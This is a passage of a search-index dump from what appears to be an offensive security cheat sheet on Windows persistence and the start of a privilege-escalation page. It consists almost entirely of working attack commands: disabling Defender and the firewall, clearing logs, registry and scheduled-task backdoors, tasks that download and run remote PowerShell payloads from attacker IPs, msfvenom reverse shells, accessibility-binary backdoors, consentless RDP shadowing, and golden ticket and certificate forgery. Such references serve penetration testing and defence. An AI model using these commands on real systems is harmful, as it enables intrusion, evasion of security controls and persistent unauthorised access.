-RemoveDefinitions -All # Remove signatures (if Internet connection is present, they will be downloaded again): PS > & \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" -RemoveDefinitions -All PS > & \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All # Disable Windows Defender Security Center reg add \"HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\" /v \"Start\" /t REG_DWORD /d \"4\" /f # Disable Real Time Protection reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f","title":"Disable Windows Defender"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#disable-windows-firewall","text":"Netsh Advfirewall show allprofiles NetSh Advfirewall set allprofiles state off # ip whitelisting New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP","title":"Disable Windows Firewall"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#clear-system-and-security-logs","text":"cmd.exe /c wevtutil.exe cl System cmd.exe /c wevtutil.exe cl Security","title":"Clear System and Security Logs"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#simple-user","text":"Set a file as hidden attrib +h c:\\autoexec.bat","title":"Simple User"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#registry-hkcu","text":"Create a REG_SZ value in the Run key within HKCU\\Software\\Microsoft\\Windows. Value name: Backdoor Value data: C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe Using the command line reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\" reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\" reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\" reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\" Using SharPersist SharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add SharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add -o env SharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"logonscript\" -m add","title":"Registry HKCU"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#startup","text":"Create a batch script in the user startup folder. PS C:\\> gc C:\\Users\\Rasta\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat start /b C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe Using SharPersist SharPersist -t startupfolder -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -f \"Some File\" -m add","title":"Startup"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#scheduled-tasks-user","text":"Using native schtask - Create a new task powershell # Create the scheduled tasks to run once at 00.00 schtasks /create /sc ONCE /st 00:00 /tn \"Device-Synchronize\" /tr C:\\Temp\\revshell.exe # Force run it now ! schtasks /run /tn \"Device-Synchronize\" Using native schtask - Leverage the schtasks /change command to modify existing scheduled tasks powershell # Launch an executable by calling the ShellExec_RunDLL function. SCHTASKS /Change /tn \"\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\" /TR \"C:\\windows\\system32\\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\\windows\\system32\\msiexec.exe /Z c:\\programdata\\S-1-5-18.dat\" /RL HIGHEST /RU \"\" /ENABLE Using Powershell powershell PS C:\\> $A = New-ScheduledTaskAction -Execute \"cmd.exe\" -Argument \"/c C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe\" PS C:\\> $T = New-ScheduledTaskTrigger -AtLogOn -User \"Rasta\" PS C:\\> $P = New-ScheduledTaskPrincipal \"Rasta\" PS C:\\> $S = New-ScheduledTaskSettingsSet PS C:\\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S PS C:\\> Register-ScheduledTask Backdoor -InputObject $D Using SharPersist ```powershell # Add to a current scheduled task SharPersist -t schtaskbackdoor -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Something Cool\" -m add","title":"Scheduled Tasks User"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#add-new-task","text":"SharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add SharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add -o hourly ```","title":"Add new task"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#bits-jobs","text":"bitsadmin /create backdoor bitsadmin /addfile backdoor \"http://10.10.10.10/evil.exe\" \"C:\\tmp\\evil.exe\" # v1 bitsadmin /SetNotifyCmdLine backdoor C:\\tmp\\evil.exe NUL bitsadmin /SetMinRetryDelay \"backdoor\" 60 bitsadmin /resume backdoor # v2 - exploit/multi/script/web_delivery bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe \"/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll\" bitsadmin /resume backdoor","title":"BITS Jobs"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#serviceland","text":"","title":"Serviceland"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#iis","text":"IIS Raid \u2013 Backdooring IIS Using Native Modules $ git clone https://github.com/0x09AL/IIS-Raid $ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS C:\\Windows\\system32\\inetsrv\\APPCMD.EXE install module /name:Module Name /image:\"%windir%\\System32\\inetsrv\\IIS-Backdoor.dll\" /add:true","title":"IIS"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#windows-service","text":"Using SharPersist SharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m add","title":"Windows Service"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#elevated","text":"","title":"Elevated"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#registry-hklm","text":"Similar to HKCU. Create a REG_SZ value in the Run key within HKLM\\Software\\Microsoft\\Windows. Value name: Backdoor Value data: C:\\Windows\\Temp\\backdoor.exe Using the command line reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\" reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\" reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\" reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\"","title":"Registry HKLM"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#winlogon-helper-dll","text":"Run executable during Windows logon msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /d \"Userinit.exe, evilbinary.exe\" /f reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /d \"explorer.exe, evilbinary.exe\" /f Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, evilbinary.exe\" -Force Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, evilbinary.exe\" -Force","title":"Winlogon Helper DLL"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#globalflag","text":"Run executable after notepad is killed reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512 reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1 reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d \"C:\\temp\\evil.exe\"","title":"GlobalFlag"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#startup-elevated","text":"Create a batch script in the user startup folder. C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp","title":"Startup Elevated"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#services-elevated","text":"Create a service that will start automatically or on-demand. # Powershell New-Service -Name \"Backdoor\" -BinaryPathName \"C:\\Windows\\Temp\\backdoor.exe\" -Description \"Nothing to see here.\" -StartupType Automatic sc start pentestlab # SharPersist SharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c backdoor.exe\" -n \"Backdoor\" -m add # sc sc create Backdoor binpath= \"cmd.exe /k C:\\temp\\backdoor.exe\" start=\"auto\" obj=\"LocalSystem\" sc start Backdoor","title":"Services Elevated"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#scheduled-tasks-elevated","text":"Scheduled Task to run as SYSTEM, everyday at 9am or on a specific day. Processes spawned as scheduled tasks have taskeng.exe process as their parent # Powershell $A = New-ScheduledTaskAction -Execute \"cmd.exe\" -Argument \"/c C:\\temp\\backdoor.exe\" $T = New-ScheduledTaskTrigger -Daily -At 9am # OR $T = New-ScheduledTaskTrigger -Daily -At \"9/30/2020 11:05:00 AM\" $P = New-ScheduledTaskPrincipal \"NT AUTHORITY\\SYSTEM\" -RunLevel Highest $S = New-ScheduledTaskSettingsSet $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S Register-ScheduledTask \"Backdoor\" -InputObject $D # Native schtasks schtasks /create /sc minute /mo 1 /tn \"eviltask\" /tr C:\\tools\\shell.cmd /ru \"SYSTEM\" schtasks /create /sc minute /mo 1 /tn \"eviltask\" /tr calc /ru \"SYSTEM\" /s dc-mantvydas /u user /p password schtasks /Create /RU \"NT AUTHORITY\\SYSTEM\" /tn [TaskName] /tr \"regsvr32.exe -s \\\"C:\\Users\\*\\AppData\\Local\\Temp\\[payload].dll\\\"\" /SC ONCE /Z /ST [Time] /ET [Time] ##(X86) - On User Login schtasks /create /tn OfficeUpdaterA /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onlogon /ru System ##(X86) - On System Start schtasks /create /tn OfficeUpdaterB /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onstart /ru System ##(X86) - On User Idle (30mins) schtasks /create /tn OfficeUpdaterC /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onidle /i 30 ##(X64) - On User Login schtasks /create /tn OfficeUpdaterA /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onlogon /ru System ##(X64) - On System Start schtasks /create /tn OfficeUpdaterB /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onstart /ru System ##(X64) - On User Idle (30mins) schtasks /create /tn OfficeUpdaterC /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onidle /i 30","title":"Scheduled Tasks Elevated"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#windows-management-instrumentation-event-subscription","text":"An adversary can use Windows Management Instrumentation (WMI) to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. __EventFilter : Trigger (new process, failed logon etc.) EventConsumer : Perform Action (execute payload etc.) __FilterToConsumerBinding : Binds Filter and Consumer Classes # Using CMD : Execute a binary 60 seconds after Windows started wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"WMIPersist\", EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\" wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"WMIPersist\", ExecutablePath=\"C:\\Windows\\System32\\binary.exe\",CommandLineTemplate=\"C:\\Windows\\System32\\binary.exe\" wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"WMIPersist\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"WMIPersist\\\"\" # Remove it Get-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='WMIPersist'\" | Remove-WmiObject -Verbose # Using Powershell (deploy) $FilterArgs = @{name='WMIPersist'; EventNameSpace='root\\CimV2'; QueryLanguage=\"WQL\"; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 90\"}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs $ConsumerArgs = @{name='WMIPersist'; CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\binary.exe\";} $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs $FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;} $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs # Using Powershell (remove) $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'WMIPersist'\" $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'WMIPersist'\" $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" $FilterConsumerBindingToCleanup | Remove-WmiObject $EventConsumerToCleanup | Remove-WmiObject $EventFilterToCleanup | Remove-WmiObject","title":"Windows Management Instrumentation Event Subscription"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#binary-replacement","text":"","title":"Binary Replacement"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#binary-replacement-on-windows-xp","text":"Feature Executable Sticky Keys C:\\Windows\\System32\\sethc.exe Accessibility Menu C:\\Windows\\System32\\utilman.exe On-Screen Keyboard C:\\Windows\\System32\\osk.exe Magnifier C:\\Windows\\System32\\Magnify.exe Narrator C:\\Windows\\System32\\Narrator.exe Display Switcher C:\\Windows\\System32\\DisplaySwitch.exe App Switcher C:\\Windows\\System32\\AtBroker.exe In Metasploit : use post/windows/manage/sticky_keys","title":"Binary Replacement on Windows XP+"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#binary-replacement-on-windows-10","text":"Exploit a DLL hijacking vulnerability in the On-Screen Keyboard osk.exe executable. Create a malicious HID.dll in C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.dll .","title":"Binary Replacement on Windows 10+"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#rdp-backdoor","text":"","title":"RDP Backdoor"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#utilmanexe","text":"At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM. REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f","title":"utilman.exe"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#sethcexe","text":"Hit F5 a bunch of times when you are at the RDP login screen. REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f","title":"sethc.exe"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#remote-desktop-services-shadowing","text":":warning: FreeRDP and rdesktop don't support Remote Desktop Services Shadowing feature. Requirements: * RDP must be running reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v Shadow /t REG_DWORD /d 4 # 4 \u2013 View Session without user\u2019s permission. # Allowing remote connections to this computer reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f # Disable UAC remote restriction reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt # /v parameter lets specify the {ADDRESS} value that is an IP address or a hostname of a remote host; # /shadow parameter is used to specify the {SESSION_ID} value that is a shadowee\u2019s session ID; # /noconsentprompt parameter allows to bypass a shadowee\u2019s permission and shadow their session without their consent; # /prompt parameter is used to specify a user\u2019s credentials to connect to a remote host.","title":"Remote Desktop Services Shadowing"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#skeleton-key","text":"# Exploitation Command runned as DA: Invoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName <DCs FQDN> # Access using the password \"mimikatz\" Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\\Administrator","title":"Skeleton Key"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#virtual-machines","text":"Based on the Shadow Bunny technique. # download virtualbox Invoke-WebRequest \"https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe\" -OutFile $env:TEMP\\VirtualBox-6.1.8-137981-Win.exe # perform a silent install and avoid creating desktop and quick launch icons VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0 # in \\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe # Disabling notifications .\\VBoxManage.exe setextradata global GUI/SuppressMessages \"all\" # Download the Virtual machine disk Copy-Item \\\\smbserver\\images\\shadowbunny.vhd $env:USERPROFILE\\VirtualBox\\IT Recovery\\shadowbunny.vhd # Create a new VM $vmname = \"IT Recovery\" .\\VBoxManage.exe createvm --name $vmname --ostype \"Ubuntu\" --register # Add a network card in NAT mode .\\VBoxManage.exe modifyvm $vmname --ioapic on # required for 64bit .\\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128 .\\VBoxManage.exe modifyvm $vmname --nic1 nat .\\VBoxManage.exe modifyvm $vmname --audio none .\\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga .\\VBoxManage.exe modifyvm $vmname --description \"Shadowbunny\" # Mount the VHD file .\\VBoxManage.exe storagectl $vmname -name \"SATA Controller\" -add sata .\\VBoxManage.exe storageattach $vmname -comment \"Shadowbunny Disk\" -storagectl \"SATA Controller\" -type hdd -medium \"$env:USERPROFILE\\VirtualBox VMs\\IT Recovery\\shadowbunny.vhd\" -port 0 # Start the VM .\\VBoxManage.exe startvm $vmname \u2013type headless # optional - adding a shared folder # require: VirtualBox Guest Additions .\\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\\ -automount # then mount the folder in the VM sudo mkdir /mnt/c sudo mount -t vboxsf shadow_c /mnt/c","title":"Virtual Machines"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#domain","text":"","title":"Domain"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#user-certificate","text":"# Request a certificate for the User template .\\Certify.exe request /ca:CA01.megacorp.local\\CA01 /template:User # Convert the certificate for Rubeus openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx # Request a TGT using the certificate .\\Rubeus.exe asktgt /user:username /certificate:C:\\Temp\\cert.pfx /password:Passw0rd123!","title":"User Certificate"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#golden-certificate","text":"Require elevated privileges in the Active Directory, or on the ADCS machine Export CA as p12 file: certsrv.msc > Right Click > Back up CA... Alternative 1: Using Mimikatz you can extract the certificate as PFX/DER ps1 privilege::debug crypto::capi crypto::cng crypto::certificates /systemstore:local_machine /store:my /export Alternative 2: Using SharpDPAPI, then convert the certificate: openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx ForgeCert - Forge a certificate for any active domain user using the CA certificate ps1 ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123 ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123 Finally you can request a TGT using the Certificate ps1 Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123","title":"Golden Certificate"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#golden-ticket","text":"Forge a Golden ticket using Mimikatz kerberos::purge kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt kerberos::tgt","title":"Golden Ticket"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#references","text":"A view of persistence - Rastamouse Windows Persistence Commands - Pwn Wiki SharPersist Windows Persistence Toolkit in C - Brett Hawkins IIS Raid \u2013 Backdooring IIS Using Native Modules - 19/02/2020 Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - Apr 27, 2020 - @phraaaaaaa Persistence - Checklist - @netbiosX Persistence \u2013 Winlogon Helper DLL - @netbiosX Persistence - BITS Jobs - @netbiosX Persistence \u2013 Image File Execution Options Injection - @netbiosX Persistence \u2013 Registry Run Keys - @netbiosX Golden Certificate - NOVEMBER 15, 2021 Beware of the Shadowbunny - Using virtual machines to persist and evade detections - Sep 23, 2020 - wunderwuzzi Persistence \u2013 WMI Event Subscription - JANUARY 21, 2020 - pentestlab Persistence via WMI Event Subscription - Elastic Security Solution","title":"References"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/","text":"Windows - Privilege Escalation Summary Tools Windows Version and Configuration User Enumeration Network Enumeration Antivirus & Detections Windows Defender Firewall AppLocker Enumeration Powershell Default Writeable Folders EoP - Looting for passwords SAM and SYSTEM files LAPS Settings HiveNightmare Search for file contents Search for a file with a certain filename Search the registry for key names and passwords Passwords in unattend.xml Wifi passwords Sticky Notes passwords Passwords stored in services Passwords stored in Key Manager Powershell History Powershell Transcript Password in Alternate Data Stream EoP - Processes Enumeration and Tasks EoP - Incorrect permissions in services EoP - Windows Subsystem for Linux (WSL) EoP - Unquoted Service Paths EoP - $PATH Interception EoP - Named Pipes EoP - Kernel Exploitation EoP - AlwaysInstallElevated EoP - Insecure GUI apps EoP - Evaluating Vulnerable Drivers EoP - Printers Universal Printer Bring Your Own Vulnerability EoP - Runas EoP - Abusing Shadow Copies EoP - From local administrator to NT SYSTEM EoP - Living Off The Land Binaries and Scripts EoP - Impersonation Privileges Restore A Service Account's Privileges Meterpreter getsystem and alternatives RottenPotato (Token Impersonation) Juicy Potato (Abusing the golden privileges) Rogue Potato (Fake OXID Resolver) ) EFSPotato (MS-EFSR EfsRpcOpenFileRaw) ) EoP - Privileged File Write DiagHub UsoDLLLoader WerTrigger EoP - Common Vulnerabilities and Exposures MS08-067 (NetAPI) MS10-015 (KiTrap0D) MS11-080 (adf.sys) MS15-051 (Client Copy Image) MS16-032 MS17-010 (Eternal Blue) CVE-2019-1388 EoP - $PATH Interception References Tools PowerSploit's PowerUp powershell powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock (Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities powershell powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1 BeRoot - Privilege Escalation Project - Windows / Linux / Mac Windows-Exploit-Suggester powershell ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems WindowsExploits - Windows exploits, mostly precompiled. Not being updated. WindowsEnum - A Powershell Privilege Escalation Enumeration Script. Seatbelt - A C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives. powershell Seatbelt.exe -group=all -full Seatbelt.exe -group=system -outputfile=\"C:\\Temp\\system.txt\" Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\\sam -password=\"yum \\\"po-ta-toes\\\"\" Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind JAWS - Just Another Windows (Enum) Script powershell powershell.exe -ExecutionPolicy Bypass -File .\\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt winPEAS - Windows Privilege Escalation Awesome Script Windows Exploit Suggester - Next Generation (WES-NG) powershell # First obtain systeminfo systeminfo systeminfo > systeminfo.txt # Then feed it to wesng python3 wes.py --update-wes python3 wes.py --update python3 wes.py systeminfo.txt PrivescCheck - Privilege Escalation Enumeration Script for Windows powershell C:\\Temp\\>powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\" C:\\Temp\\>powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended\" C:\\Temp\\>powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML\" Windows Version and Configuration systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" Extract patchs and updates wmic qfe Architecture wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% List all env variables set Get-ChildItem Env: | ft Key,Value List all drives wmic logicaldisk get caption || fsutil fsinfo drives wmic logicaldisk get caption,description,providername Get-PSDrive | where {$_.Provider -like \"Microsoft.PowerShell.Core\\FileSystem\"}| ft Name,Root User Enumeration Get current username echo %USERNAME% || whoami $env:username List user privilege whoami /priv whoami /groups List all users net user whoami /all Get-LocalUser | ft Name,Enabled,LastLogon Get-ChildItem C:\\Users -Force | select Name List logon requirements; useable for bruteforcing ```powershell$env:usernadsc net accounts Get details about a user (i.e. administrator, admin, current user) ```powershell net user administrator net user admin net user %USERNAME% List all local groups net localgroup Get-LocalGroup | ft Name Get details about a group (i.e. administrators) net localgroup administrators Get-LocalGroupMember Administrators | ft Name, PrincipalSource Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource Get Domain Controllers nltest /DCLIST:DomainName nltest /DCNAME:DomainName nltest /DSGETDC:DomainName Network Enumeration List all network interfaces, IP, and DNS. ipconfig /all Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address Get-DnsClientServerAddress -AddressFamily IPv4 | ft List current routing table route print Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex List the ARP table arp -A Get-NetNeighbor -AddressFamily IPv4 | ft 